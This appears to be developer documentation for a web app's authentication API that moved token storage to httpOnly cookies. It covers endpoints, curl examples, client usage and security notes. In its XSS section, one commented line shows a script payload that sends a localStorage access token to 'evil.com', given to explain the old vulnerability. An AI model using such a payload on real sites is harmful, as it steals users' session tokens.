# Authentication API - httpOnly Cookie Implementation

**Last Updated:** 2026-02-19
**Status:** ✅ Production Ready
**Security Level:** High (XSS Protected)

## Overview

All authentication endpoints now use **httpOnly cookies** for token storage. This prevents XSS attacks from stealing tokens.

**Security Benefits:**

- ✅ **HttpOnly flag**: JavaScript cannot access cookies
- ✅ **SameSite=lax**: Prevents CSRF attacks
- ✅ **Secure flag** (production): HTTPS-only transmission
- ✅ **Expiring tokens**: Automatic expiration
- ✅ **Zero tokens in localStorage**: No client-side token storage

---

## Cookies

### Cookie Types

| Cookie          | Purpose           | Duration         | HttpOnly | SameSite |
| --------------- | ----------------- | ---------------- | -------- | -------- |
| `access_token`  | JWT access token  | 1 hour (3600s)   | ✅       | lax      |
| `refresh_token` | JWT refresh token | 7 days (604800s) | ✅       | lax      |
| `user_data`     | User profile data | 1 hour (3600s)   | ✅       | lax      |

### Cookie Attributes

```javascript
// Production
Set-Cookie: access_token=<value>; Path=/; Expires=...; HttpOnly; Secure; SameSite=lax

// Development (localhost)
Set-Cookie: access_token=<value>; Path=/; Expires=...; HttpOnly; SameSite=lax
```

**Note:** `Secure` flag only set in production (HTTPS).

---

## API Endpoints

### 1. Login

**Endpoint:** `POST /api/auth/login`

**Request:**

```json
{
  "email": "user@example.com",
  "password": "Password123!"
}
```

**Response:** `200 OK`

```json
{
  "user": {
    "id": "user-123",
    "email": "user@example.com",
    "first_name": "John",
    "last_name": "Doe",
    "role": "sales_agent",
    "is_email_verified": true,
    "is_2fa_enabled": false
  }
}
```

**Cookies Set:**

```
set-cookie: access_token=...; Path=/; Expires=...; HttpOnly; SameSite=lax
set-cookie: refresh_token=...; Path=/; Expires=...; HttpOnly; SameSite=lax
set-cookie: user_data=%7B...%7D; Path=/; Expires=...; HttpOnly; SameSite=lax
```

**Error Responses:**

- `400 Bad Request`: Invalid email/password format
- `401 Unauthorized`: Invalid credentials
- `500 Internal Server Error`: Server error

**Example:**

```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com","password":"Password123!"}' \
  -c cookies.txt
```

---

### 2. Register

**Endpoint:** `POST /api/auth/register`

**Request:**

```json
{
  "email": "newuser@example.com",
  "password": "Password123!",
  "first_name": "Jane",
  "last_name": "Smith"
}
```

**Response:** `200 OK`

```json
{
  "user": {
    "id": "user-456",
    "email": "newuser@example.com",
    "first_name": "Jane",
    "last_name": "Smith",
    "role": "sales_user",
    "is_email_verified": false,
    "is_2fa_enabled": false
  }
}
```

**Cookies Set:** Same as login

**Error Responses:**

- `400 Bad Request`: Validation errors
- `409 Conflict`: Email already exists
- `500 Internal Server Error`: Server error

**Example:**

```bash
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"new@example.com","password":"Password123!","first_name":"Jane","last_name":"Smith"}'
```

---

### 3. Get Current User (/api/auth/me)

**Endpoint:** `GET /api/auth/me`

**Request:**

- Requires valid httpOnly cookies
- No Authorization header needed (cookies sent automatically)

**Response:** `200 OK`

```json
{
  "id": "user-123",
  "email": "user@example.com",
  "first_name": "John",
  "last_name": "Doe",
  "role": "sales_agent",
  "is_email_verified": true,
  "is_2fa_enabled": false
}
```

**Error Responses:**

- `401 Unauthorized`: Not authenticated or invalid cookies

**Example:**

```bash
curl http://localhost:3000/api/auth/me -b cookies.txt
```

---

### 4. Logout

**Endpoint:** `POST /api/auth/logout`

**Request:** Empty body

**Response:** `200 OK`

```json
{
  "message": "Logout successful"
}
```

**Cookies Cleared:**

```
set-cookie: access_token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT
set-cookie: refresh_token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT
set-cookie: user_data=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT
```

**Example:**

```bash
curl -X POST http://localhost:3000/api/auth/logout -b cookies.txt
```

---

### 5. Forgot Password

**Endpoint:** `POST /api/auth/forgot-password`

**Request:**

```json
{
  "email": "user@example.com"
}
```

**Response:** `200 OK`

```json
{
  "message": "Password reset email sent"
}
```

**Error Responses:**

- `400 Bad Request`: Invalid email
- `404 Not Found`: Email not found (may still return 200 for security)

**Example:**

```bash
curl -X POST http://localhost:3000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com"}'
```

---

### 6. Reset Password

**Endpoint:** `POST /api/auth/reset-password`

**Request:**

```json
{
  "token": "reset-token-from-email",
  "new_password": "NewPassword123!"
}
```

**Response:** `200 OK`

```json
{
  "message": "Password reset successful"
}
```

**Error Responses:**

- `400 Bad Request`: Invalid token or password
- `401 Unauthorized`: Token expired or invalid

**Example:**

```bash
curl -X POST http://localhost:3000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"token":"...","new_password":"NewPassword123!"}'
```

---

### 7. Verify Email

**Endpoint:** `POST /api/auth/verify-email`

**Request:**

```json
{
  "token": "verification-token-from-email"
}
```

**Response:** `200 OK`

```json
{
  "message": "Email verified successfully"
}
```

**Error Responses:**

- `400 Bad Request`: Invalid token
- `401 Unauthorized`: Token expired

**Example:**

```bash
curl -X POST http://localhost:3000/api/auth/verify-email \
  -H "Content-Type: application/json" \
  -d '{"token":"..."}'
```

---

## Client-Side Usage

### DO's ✅

```typescript
// Use server actions (recommended)
import { login } from "@/lib/api/authApi";

// In component or Server Action
await login(email, password);
// Cookies are set automatically by the server
```

```typescript
// Check auth status
import { getCurrentUser } from "@/lib/api/authApi";

const user = await getCurrentUser();
// Server reads cookies automatically
```

### DON'Ts ❌

```typescript
// NEVER do this (cookies are httpOnly)
const token = document.cookie; // ❌ WON'T WORK

// NEVER do this (tokens not in localStorage)
const token = localStorage.getItem("access_token"); // ❌ DOESN'T EXIST

// NEVER send Authorization header manually
fetch("/api/auth/me", {
  headers: {
    Authorization: `Bearer ${token}`, // ❌ NOT NEEDED
  },
});
```

---

## Testing

### Manual Testing with curl

```bash
# 1. Login and save cookies
curl -i -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"Password123!"}' \
  -c cookies.txt

# 2. Use cookies for authenticated requests
curl -i http://localhost:3000/api/auth/me -b cookies.txt

# 3. Logout
curl -i -X POST http://localhost:3000/api/auth/logout -b cookies.txt
```

### Browser DevTools

**Application Tab → Cookies:**

1. Open Chrome DevTools (F12)
2. Go to **Application** tab
3. Select **Cookies** → `http://localhost:3000`
4. Verify:
   - `access_token`, `refresh_token`, `user_data` exist
   - **HttpOnly: ✅** checkbox is checked
   - **SameSite: Lax**
   - **Path: /**

**Console Tab:**

```javascript
// This should return EMPTY (cookies not accessible)
document.cookie;
// Returns: ""

// This should fail (localStorage has no tokens)
localStorage.getItem("access_token");
// Returns: null
```

---

## Security Considerations

### XSS Protection

**Before (Vulnerable):**

```typescript
// localStorage - XSS CAN steal this
localStorage.setItem("access_token", "eyJhbG...");
// Attacker can execute:
// <script>fetch('https://evil.com?token='+localStorage.getItem('access_token'))</script>
```

**After (Protected):**

```typescript
// httpOnly cookies - XSS CANNOT access
// Cookies are automatically sent by browser
// JavaScript cannot read them
document.cookie; // Returns: "" (empty, httpOnly cookies hidden)
```

### CSRF Protection

**SameSite=lax** prevents CSRF attacks:

- Cookies sent with top-level navigation
- Cookies NOT sent with cross-origin POST requests
- Additional CSRF tokens can be added if needed

### Token Rotation

- **Access token**: Short-lived (1 hour)
- **Refresh token**: Long-lived (7 days)
- Backend validates tokens on every request
- Automatic refresh handled by server

---

## Migration Notes

### Changes from localStorage

| Before                                 | After                         |
| -------------------------------------- | ----------------------------- |
| `localStorage.getItem("access_token")` | Server reads httpOnly cookies |
| `Authorization: Bearer ${token}`       | Cookies sent automatically    |
| Manual token refresh                   | Server handles refresh        |
| Client-side token storage              | Server-side only              |
| XSS vulnerable                         | XSS protected                 |

### Breaking Changes

**If you were using localStorage directly:**

```typescript
// OLD (doesn't work anymore)
const token = localStorage.getItem("access_token");
const user = JSON.parse(localStorage.getItem("user"));

// NEW (use server actions)
const user = await getCurrentUser();
// Or use Zustand store
const { user, isAuthenticated } = useAuthStore();
```

---

## Troubleshooting

### Issue: "Not authenticated" errors

**Cause:** Cookies not being sent

**Solutions:**

1. Check browser cookies in DevTools
2. Verify cookies have `HttpOnly` flag
3. Check cookie domain/path matches request
4. Clear all cookies and login again

### Issue: CORS errors

**Cause:** Cross-origin requests blocked

**Solutions:**

1. Ensure API and frontend share same domain
2. Check CORS configuration allows credentials
3. Verify `SameSite` cookie attribute

### Issue: Cookies disappearing

**Cause:** Cookie attributes incorrect

**Solutions:**

1. Check `Path=/` is set
2. Verify domain matches (localhost vs 127.0.0.1)
3. Check expiration dates are valid
4. Ensure browser accepts cookies

---

## Implementation Files

**Server Actions (Next.js 15+):**

- `apps/web/src/app/api/auth/login/route.ts`
- `apps/web/src/app/api/auth/register/route.ts`
- `apps/web/src/app/api/auth/logout/route.ts`
- `apps/web/src/app/api/auth/me/route.ts`
- `apps/web/src/app/api/auth/forgot-password/route.ts`
- `apps/web/src/app/api/auth/reset-password/route.ts`
- `apps/web/src/app/api/auth/verify-email/route.ts`

**Client Store:**

- `apps/web/src/stores/authStore.ts`
- `apps/web/src/hooks/useAuth.ts`

**API Client:**

- `apps/web/src/lib/api/authApi.ts`

---

## References

- [MDN: Set-Cookie Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [OWASP: HttpOnly Cookie](https://owasp.org/www-community/controls/HttpOnly)
- [Next.js: Server Actions](https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions-and-mutations)
- [OWASP: CSRF](https://owasp.org/www-community/attacks/csrf)
- [OWASP: XSS](https://owasp.org/www-community/attacks/xss/)

---

**Changelog:**

- **2026-02-19**: Initial version - Complete httpOnly cookie implementation
- **Security**: XSS protection via HttpOnly flag
- **Security**: CSRF protection via SameSite=lax
- **Breaking**: Removed localStorage token storage
